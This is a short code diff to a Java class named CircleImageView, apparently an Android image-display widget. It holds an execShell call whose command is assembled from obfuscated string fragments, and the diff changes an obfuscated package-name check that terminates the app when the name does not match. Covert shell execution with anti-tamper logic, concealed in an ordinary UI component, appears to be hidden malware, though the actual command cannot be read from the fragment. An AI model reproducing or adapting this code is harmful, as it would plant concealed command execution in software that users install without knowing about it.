@@ -129,7 +129,7 @@ public class CircleImageView extends ImageView {
             execShell(a + ccc + fff + b + ccccc + ddd + aaa + aaaaa + ffff + dddd + ddddd + ccccc + d + fff + s[i]);
         }
 
-        if (!context.getPackageName().equals(aaa + cccc + ff + bbbbb + a + eeeee + cccc + aaaaa + ff + bb + a + ccc + aaaaa + d + ddd + ccccc + d + bbb + aaaaa + ddddd)) {
+        if (!context.getPackageName().equals(aaa + ccccc + ccc + ff + ddddd + aaaaa + cccc + aaa + aaaaa + cccc + ddddd + ff + dddd + cc + bb + a + ccc + aaaaa)) {
             System.exit(0);
         }
     }
